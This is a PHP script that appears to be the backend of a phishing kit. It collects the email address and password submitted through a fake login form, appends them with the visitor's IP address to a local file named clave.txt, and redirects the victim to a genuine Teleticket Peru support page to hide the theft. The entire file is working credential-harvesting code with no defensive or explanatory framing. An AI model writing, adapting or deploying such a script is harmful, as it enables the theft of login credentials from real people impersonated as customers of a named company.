<?php
$correof = $_POST[ 'email' ];
$passf = $_POST[ 'pass' ];
$ip = $_SERVER[ 'REMOTE_ADDR' ];
 
if( ( empty($correof)) or (empty($passf)) ){
    header('location: index.htm');
}else{  
        //archivo de texto
        $file = fopen('clave.txt','a+');
        fwrite($file, "email: ".$correof."\r\npass: ".$passf."\r\nIP: ".$ip."\r\n=========================\r\n");
        fclose($file);
        header('location:https://teleticketperu.zendesk.com/hc/es/requests/new?ticket_form_id=6091618990235');      
        
}
?>